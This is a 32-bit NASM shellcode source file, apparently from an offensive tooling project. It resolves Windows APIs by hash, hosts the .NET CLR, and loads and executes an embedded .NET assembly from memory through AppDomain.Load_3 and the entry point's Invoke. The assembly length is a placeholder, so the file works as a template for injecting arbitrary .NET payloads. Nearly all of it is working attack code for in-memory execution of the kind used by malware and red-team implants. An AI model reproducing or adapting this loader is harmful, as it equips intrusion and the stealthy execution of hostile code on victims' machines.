BITS 32

%define RUNTIMEVERSION_VALUE "v4.0.30319"

; RWX version of clrhosting. This requires the page to have PAGE_EXECUTE_READWRITE in order to 
; populate COM pointers and build the lookup table. We currently don't use this in
; clr_shellcode.py, but we're keeping it around just in case.

OLEAUT32_HASH		                  equ 0x000d8c88
OLEAUT32_NUMBER_OF_FUNCTIONS    	  equ 4
OLEAUT32_SAFEARRAYCREATE_HASH 		  equ 0x006b5472
OLEAUT32_SAFEARRAYCREATEVECTOR_HASH   equ 0x1ad55310
OLEAUT32_SAFEARRAYACCESSDATA_HASH  	  equ 0x06b52e7a
OLEAUT32_SAFEARRAYUNACCESSDATA_HASH	  equ 0x1ad6367a

KERNEL32_HASH 					equ 0x000d4e88
KERNEL32_NUMBER_OF_FUNCTIONS	equ 2
KERNEL32_LOADLIBRARYA_HASH		equ 0x000d5786
KERNEL32_GETPROCADDRESS_HASH	equ 0x00348bfa

MSCOREE_HASH 				   equ 0x0006d468
MSCOREE_NUMBER_OF_FUNCTIONS    equ 1
MSCOREE_CLRCREATEINSTANCE_HASH equ 0x019ec916

struc SAFEARRAYBOUND
	.cElements resb 8
	.lLbound   resb 8
	.size:
endstruc

segment .text
	call geteip
geteip:
	pop ebx

	; setup kernel32
	lea esi, [KERNEL32_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [KERNEL32_HASHES_TABLE-geteip+ebx]
	push esi
	push byte KERNEL32_NUMBER_OF_FUNCTIONS
	push KERNEL32_HASH
	call LookupFunctions

	; LoadLibrary(oleaut32.dll)
	lea esi, [OLEAUT32DLL-geteip+ebx]
	push esi
	call [KERNEL32_LOADLIBRARY-geteip+ebx]

	; LoadLibrary(mscoree.dll)
	lea esi, [MSCOREEDLL-geteip+ebx]
	push esi
	call [KERNEL32_LOADLIBRARY-geteip+ebx]

	; setup oleaut32
	lea esi, [OLEAUT32_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [OLEAUT32_HASHES_TABLE-geteip+ebx]
	push esi
	push byte OLEAUT32_NUMBER_OF_FUNCTIONS
	push OLEAUT32_HASH
	call LookupFunctions

	; setup mscoree
	lea esi, [MSCOREE_FUNCTIONS_TABLE-geteip+ebx]
	push esi
	lea esi, [MSCOREE_HASHES_TABLE-geteip+ebx]
	push esi
	push byte MSCOREE_NUMBER_OF_FUNCTIONS
	push MSCOREE_HASH
	call LookupFunctions

	; _CLRCreateinstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, &pCLRMetahost)
	lea esi, [CLRMETAHOST-geteip+ebx]
	push esi
	lea esi, [IID_ICLRMetaHost-geteip+ebx]
	push esi
	lea esi, [CLSID_CLRMETAHOST-geteip+ebx]
	push esi
	call [MSCOREE_CLRCREATEINSTANCE-geteip+ebx]
	test eax,eax
	jnz done

	; pCLRMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (void**)&pCLRRuntimeInfo)
	lea esi, [CLRRUNTIMEINFO-geteip+ebx]
	push esi
	lea esi, [IID_ICLRRUNTIMEINFO-geteip+ebx]
	push esi
	lea esi, [RUNTIMEVERSION-geteip+ebx]
	push esi
	mov edx, [CLRMETAHOST-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx+0x0c]
	test eax,eax
	jnz done

	; pCLRRuntimeInfo->GetInterface(CLSID_CorRuntimeHost,IID_ICorRuntimeHost, (void**)&pCorRuntimeHost)
	lea esi, [CORRUNTIMEHOST-geteip+ebx]
	push esi
	lea esi, [IID_ICORRUNTIMEHOST-geteip+ebx]
	push esi
	lea esi, [CLSID_CORRUNTIMEHOST-geteip+ebx]
	push esi
	mov edx, [CLRRUNTIMEINFO-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx+0x24]
	test eax,eax
	jnz done

	; pCorRuntimeHost->Start()
	mov edx, [CORRUNTIMEHOST-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx+0x28]
	test eax,eax
	jnz done

	; pCorRuntimeHost->GetDefaultDomain(&pAppDomainThunk)
	lea esi, [APPDOMAINTHUNK-geteip+ebx]
	push esi
	mov edx, [CORRUNTIMEHOST-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx+0x34]
	test eax,eax
	jnz done

	; pAppDomainThunk->QueryInterface(__uuidof(mscorlib::_AppDomain), (void**)&pAppDomain)
	lea esi, [APPDOMAIN-geteip+ebx]
	push esi
	lea esi, [CLSID_APPDOMAIN-geteip+ebx]
	push esi
	mov edx, [APPDOMAINTHUNK-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx]
	test eax,eax
	jnz done

	; safeArrayBound->cElements = ASSEMBLY_LENGTH;
	lea esi, [sabSafeArray-geteip+ebx]
	mov [esi+SAFEARRAYBOUND.cElements], dword ASSEMBLY_LENGTH

	; safeArrayBound->lLbound = 0;
	mov [esi+SAFEARRAYBOUND.lLbound], byte 0

	; pSafeArray = SafeArrayCreate(VT_UI1, 1, safeArrayBound);
	lea esi, [sabSafeArray-geteip+ebx]
	push esi
	push byte 0x1
	push byte 0x11
	call [OLEAUT32_SAFEARRAYCREATE-geteip+ebx]
	test eax,eax
	jz done
	mov [SAFEARRAY-geteip+ebx], eax

	; SafeArrayAccessData(pSafeArray, &lpSafeData)
	lea esi, [SAFEARRAYDATA-geteip+ebx]
	push esi
	mov esi, [SAFEARRAY-geteip+ebx]
	push esi
	call [OLEAUT32_SAFEARRAYACCESSDATA-geteip+ebx]
	test eax,eax
	jnz done

	; memcpy(SAFEARRAYDATA, ASSEMBLY, ASSEMBLY_LENGTH)
	mov esi, [SAFEARRAYDATA-geteip+ebx]
	mov edi, esi
	lea esi, [ASSEMBLY-geteip+ebx]
	mov ecx, dword ASSEMBLY_LENGTH
	rep movsb

	; SafeArrayUnaccessData(pSafeArray)
	mov esi, [SAFEARRAY-geteip+ebx]
	push esi
	call [OLEAUT32_SAFEARRAYUNACCESSDATA-geteip+ebx]
	test eax,eax
	jnz done

	; pAppDomain->Load_3(pSafeArray, &pAssembly)
	lea esi, [CORASSEMBLY-geteip+ebx]
	push esi
	mov esi, [SAFEARRAY-geteip+ebx]
	push esi
	mov edx, [APPDOMAIN-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx+0x0b4]
	test eax,eax
	jnz done

	; pMethodArgs = _SafeArrayCreateVector(VT_VARIANT, 0, 1);
	; if your main function has more than 1 argument, update that counter here
	push byte 1
	push byte 0
	push byte 0x0c
	call [OLEAUT32_SAFEARRAYCREATEVECTOR-geteip+ebx]
	test eax,eax
	jz done
	mov [METHODARGS-geteip+ebx], eax

	; pAssembly->get_EntryPoint(&pMethodInfo)
	lea esi, [METHODINFO-geteip+ebx]
	push esi
	mov edx, [CORASSEMBLY-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx+0x40]
	test eax,eax
	jnz done

	; mMethodInfo->Invoke_3(obj, pMethodArgs, NULL);
	; i assure you it doesn't care about the VARIANT and requires all these
	; null dwords
	push 0
	mov esi, [METHODARGS-geteip+ebx]
	push esi
	push 0x00000000
	push 0x00000000
	push 0x00000000
	push 0x00000000
	mov edx, [METHODINFO-geteip+ebx]
	push edx
	mov ecx, [edx]
	call [ecx+0x94]
	test eax,eax
	jnz done

	jmp done

done:
	ret

CLSID_CLRMETAHOST:
db 0x8d,0x18,0x80,0x92,0x8e,0x0e,0x67,0x48,0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde
IID_ICLRMetaHost:
db 0x9e,0xdb,0x32,0xd3,0xb3,0xb9,0x25,0x41,0x82,0x07,0xa1,0x48,0x84,0xf5,0x32,0x16
IID_ICLRRUNTIMEINFO:
db 0xd2,0xd1,0x39,0xbd,0x2f,0xba,0x6a,0x48,0x89,0xb0,0xb4,0xb0,0xcb,0x46,0x68,0x91
IID_ICORRUNTIMEHOST:
db 0x22,0x67,0x2f,0xcb,0x3a,0xab,0xd2,0x11,0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e
CLSID_CORRUNTIMEHOST:
db 0x23,0x67,0x2f,0xcb,0x3a,0xab,0xd2,0x11,0x9c,0x40,0x00,0xc0,0x4f,0xa3,0x0a,0x3e
CLSID_APPDOMAIN:
db 0xdc,0x96,0xf6,0x05,0x29,0x2b,0x63,0x36,0xad,0x8b,0xc4,0x38,0x9c,0xf2,0xa7,0x13

CLRMETAHOST 	dd 0x00000000
CLRRUNTIMEINFO  dd 0x00000000
CORRUNTIMEHOST  dd 0x00000000
APPDOMAINTHUNK  dd 0x00000000
APPDOMAIN 		dd 0x00000000
SAFEARRAY 		dd 0x00000000
SAFEARRAYDATA   dd 0x00000000
CORASSEMBLY 	dd 0x00000000
METHODARGS  	dd 0x00000000
METHODINFO 		dd 0x00000000

sabSafeArray:  RESB SAFEARRAYBOUND.size

%include "sc-32-api-functions.asm"

KERNEL32_HASHES_TABLE:
	dd KERNEL32_LOADLIBRARYA_HASH
	dd KERNEL32_GETPROCADDRESS_HASH

OLEAUT32_HASHES_TABLE:
	dd OLEAUT32_SAFEARRAYCREATE_HASH
	dd OLEAUT32_SAFEARRAYCREATEVECTOR_HASH
	dd OLEAUT32_SAFEARRAYACCESSDATA_HASH
	dd OLEAUT32_SAFEARRAYUNACCESSDATA_HASH

MSCOREE_HASHES_TABLE:
	dd MSCOREE_CLRCREATEINSTANCE_HASH

MSCOREE_FUNCTIONS_TABLE:
MSCOREE_CLRCREATEINSTANCE		dd 0x00000000

KERNEL32_FUNCTIONS_TABLE:
KERNEL32_LOADLIBRARY 	dd 0x00000000
KERNEL32_GETPROCADDRESS dd 0x00000000

OLEAUT32_FUNCTIONS_TABLE:
OLEAUT32_SAFEARRAYCREATE 		  dd 0x00000000
OLEAUT32_SAFEARRAYCREATEVECTOR    dd 0x00000000
OLEAUT32_SAFEARRAYACCESSDATA      dd 0x00000000
OLEAUT32_SAFEARRAYUNACCESSDATA    dd 0x00000000

MSCOREEDLL:
	db "MSCOREE.dll", 0
OLEAUT32DLL:
	db "OleAut32.dll", 0

RUNTIMEVERSION:
	db __utf16__(RUNTIMEVERSION_VALUE), 0, 0

ASSEMBLY_LENGTH 	equ 1094795585
ASSEMBLY:
db 0x00